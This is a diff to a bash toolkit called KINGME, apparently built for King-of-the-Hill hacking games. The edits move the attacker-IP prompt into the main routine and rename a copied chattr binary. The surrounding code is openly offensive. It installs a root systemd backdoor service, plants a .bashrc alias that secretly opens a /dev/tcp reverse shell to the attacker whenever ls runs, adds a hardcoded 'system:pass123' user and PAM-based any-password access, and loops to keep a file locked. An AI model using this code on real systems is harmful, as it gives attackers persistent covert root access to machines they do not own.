@@ -41,10 +41,8 @@ echo -e "${YEL} Root Systemd Backdoor... ${RST}"
 echo -e "What do you want to name your service?"
 read name
 
-echo -e "Enter LHOST"
-read lhost
 
-echo -e "Enter LPORT"
+echo -e "Enter PORT"
 read lport
 
 cat << EOF > /etc/systemd/system/$name.service
@@ -98,9 +96,7 @@ echo -e "${RED}${HLT} [+] system:pass123 ${RST}"
 # Create an alias in .bashrc
 bashrc() {
 echo -e "${YEL} Creating .bashrc Alias... ${RST}"
-echo "Enter LHOST"
-read lhost
-echo "Enter LPORT"
+echo "Enter PORT"
 read lport
 echo "alias ls='(bash -i >& /dev/tcp/$lhost/$lport 0>&1 & disown) 2>/dev/null; ls --color=auto'" >> /root/.bashrc && source /root/.bashrc
 echo -e "${RED}${HLT} [+] Alias Created  ${RST}"
@@ -123,9 +119,7 @@ echo -e "${RED}${HLT}[+] Any User / Any Password ${RST}"
 
 scripts() {
 
-echo "Enter LHOST"
-read lhost
-echo "Enter LPORT"
+echo "Enter PORT"
 read lport
 echo "Which file?"
 read file
@@ -151,7 +145,7 @@ copyBin(){
   cp $(which koth) . 2>/tmp/test
   cp $(which systemctl) . 
   cp $(which sed) . && mv sed s
-  cp $(which chattr) . && mv chattr c
+  cp $(which chattr) . && mv chattr $cttr
   cp $(which lsattr) . && mv lsattr l
   cp $(which mount) . && mv mount m
   cp $(which umount) . && mv umount u
@@ -165,6 +159,8 @@ copyTools() {
   read pwd
   echo "Name your tool folder:"
   read dir
+  echo "Name you chattr:"
+  read cttr
   mkdir $pwd/$dir
   cd $pwd/$dir
   copyBin
@@ -183,30 +179,30 @@ kingMe1(){
     echo "king" > $kf
       while true;do
         $wd/u -l $kf &> /tmp/debug
-        $wd/c -ia /root &> /tmp/debug
-        $wd/c -ia $kf &> /tmp/debug
+        $wd/$cttr -ia /root &> /tmp/debug
+        $wd/$cttr -ia $kf &> /tmp/debug
         $wd/mod 666 $kf &> /tmp/debug
         set +o noclobber $kf &> /tmp/debug
         $wd/s -i "s/.*/$kng/g" $kf &> /tmp/debug
-        $wd/c +ia $kf &> /tmp/debug
+        $wd/$cttr +ia $kf &> /tmp/debug
         sleep 0.1
       done &
   else
     while true;do
       $wd/u -l $kf &> /tmp/debug
-      $wd/c -ia /root &> /tmp/debug
-      $wd/c -ia $kf &> /tmp/debug
+      $wd/$cttr -ia /root &> /tmp/debug
+      $wd/$cttr -ia $kf &> /tmp/debug
       $wd/mod 666 $kf &> /tmp/debug
       set +o noclobber $kf &> /tmp/debug
       $wd/s -i "s/.*/$kng/g" $kf &> /tmp/debug
-      $wd/c +ia $kf &> /tmp/debug
+      $wd/$cttr +ia $kf &> /tmp/debug
       sleep 0.1
     done &
   fi
 }
 
 logo() {
-echo '
+echo -e "${YEL}
 
    ▄█   ▄█▄  ▄█  ███▄▄▄▄      ▄██████▄  
   ███ ▄███▀ ███  ███▀▀▀██▄   ███    ███ 
@@ -217,6 +213,7 @@ echo '
   ███ ▀███▄ ███  ███   ███   ███    ███ 
   ███   ▀█▀ █▀    ▀█   █▀    ████████▀  
   ▀                                     
+${RST}
        ▄▄▄▄███▄▄▄▄      ▄████████       
      ▄██▀▀▀███▀▀▀██▄   ███    ███       
      ███   ███   ███   ███    █▀        
@@ -226,8 +223,8 @@ echo '
      ███   ███   ███   ███    ███       
       ▀█   ███   █▀    ██████████    v0.1
 
-                           By Trapnatized                                            
-'                                                                                           
+                           By ${BLU}Trapnatized${RST}
+"                                                                                           
 }
 
 
@@ -239,7 +236,7 @@ logo
 
     #cat << EOF  
 echo -e " 
-    $KC      ${YEL}MAIN MENU${RST}    $KC
+        $KC      ${YEL}MAIN MENU${RST}    $KC
 
 
   ${GRN}[01]${RST} Persistence                ${GRN}[04]${RST} Trolls
@@ -247,7 +244,7 @@ echo -e "
   ${GRN}[03]${RST} Kingme                     ${GRN}[06]${RST} ...
 
 
-    ${RED}[*]${RST}     ${RED}[99]${RST} Exit    ${RED}[*]${RST}
+        ${RED}[*]${RST}     ${RED}[99]${RST} Exit    ${RED}[*]${RST}
 
 "
 #EOF
@@ -281,7 +278,7 @@ kMenu() {
 logo
     #cat << EOF       
 echo -e "
-    $KC      ${YEL}KING MENU${RST}    $KC
+        $KC      ${YEL}KING MENU${RST}    $KC
 
 
   ${GRN}[01]${RST} KingMe                     ${GRN}[04]${RST} ...
@@ -289,8 +286,8 @@ echo -e "
   ${GRN}[03]${RST} ...                        ${GRN}[06]${RST} ...
 
 
-    ${YEL}[*]${RST}     ${YEL}[00]${RST} ../     ${YEL}[*]${RST}  
-    ${RED}[*]${RST}     ${RED}[99]${RST} Exit    ${RED}[*]${RST}
+        ${YEL}[*]${RST}     ${YEL}[00]${RST} ../     ${YEL}[*]${RST}  
+        ${RED}[*]${RST}     ${RED}[99]${RST} Exit    ${RED}[*]${RST}
 "
 #EOF
 
@@ -325,7 +322,7 @@ pMenu() {
 logo
     #cat << EOF   
 echo -e "
-    $FR      ${YEL}PERSISTENCE MENU${RST}    $FR
+        $FR      ${YEL}PERSISTENCE MENU${RST}    $FR
 
 
   ${GRN}[01]${RST} Systemd Service            ${GRN}[04]${RST} Bashrc Alias
@@ -333,9 +330,9 @@ echo -e "
   ${GRN}[03]${RST} Root System User           ${GRN}[06]${RST} PAM
                                   ${GRN}[07]${RST} ALL 
 
-    ${YEL}[*]${RST} More coming soon ${YEL}[*]${RST}
-    ${YEL}[*]${RST}     ${YEL}[00]${RST} ../     ${YEL}[*]${RST}
-    ${RED}[*]${RST}     ${RED}[99]${RST} Exit    ${RED}[*]${RST}
+        ${YEL}[*]${RST} More coming soon ${YEL}[*]${RST}
+        ${YEL}[*]${RST}     ${YEL}[00]${RST} ../     ${YEL}[*]${RST}
+        ${RED}[*]${RST}     ${RED}[99]${RST} Exit    ${RED}[*]${RST}
 "
 #EOF
 
@@ -393,7 +390,7 @@ tMenu() {
 logo
     #cat << EOF       
 echo -e "
-    $TL      ${YEL}TOOL MENU${RST}    $TL
+        $TL      ${YEL}TOOL MENU${RST}    $TL
 
 
   ${GRN}[01]${RST} Backup                     ${GRN}[04]${RST} ...
@@ -401,8 +398,8 @@ echo -e "
   ${GRN}[03]${RST} ...                        ${GRN}[06]${RST} ...
 
 
-    ${YEL}[*]${RST}     ${YEL}[00]${RST} ../     ${YEL}[*]${RST}  
-    ${RED}[*]${RST}     ${RED}[99]${RST} Exit    ${RED}[*]${RST}
+        ${YEL}[*]${RST}     ${YEL}[00]${RST} ../     ${YEL}[*]${RST}  
+        ${RED}[*]${RST}     ${RED}[99]${RST} Exit    ${RED}[*]${RST}
 "
 #EOF
 
@@ -439,16 +436,16 @@ TMenu() {
 logo
     #cat << EOF       
 echo -e "
-    $MF      ${YEL}TROLL MENU${RST}    $MF
+        $MF      ${YEL}TROLL MENU${RST}    $MF
 
 
   ${GRN}[01]${RST} Scripts                    ${GRN}[04]${RST} ...
   ${GRN}[02]${RST} Games                      ${GRN}[05]${RST} ...
   ${GRN}[03]${RST} Other                      ${GRN}[06]${RST} ...
 
-    ${YEL}[*]${RST}     Coming Soon...           ${YEL}[*]${RST}
-    ${YEL}[*]${RST}     ${YEL}[00]${RST} ../     ${YEL}[*]${RST}  
-    ${RED}[*]${RST}     ${RED}[99]${RST} Exit    ${RED}[*]${RST}
+        ${YEL}[*]${RST}    Coming Soon   ${YEL}[*]${RST}
+        ${YEL}[*]${RST}     ${YEL}[00]${RST} ../     ${YEL}[*]${RST}  
+        ${RED}[*]${RST}     ${RED}[99]${RST} Exit    ${RED}[*]${RST}
 "
 #EOF
 
@@ -478,7 +475,8 @@ main() {
     echo -e "${RED}[${SK}] Run as Root... ${RST}" >&2
     exit 1
   fi
-
+  printf "${GRN}Enter your attacker IP: ${RST}"
+  read lhost
   clear
   menu
 }
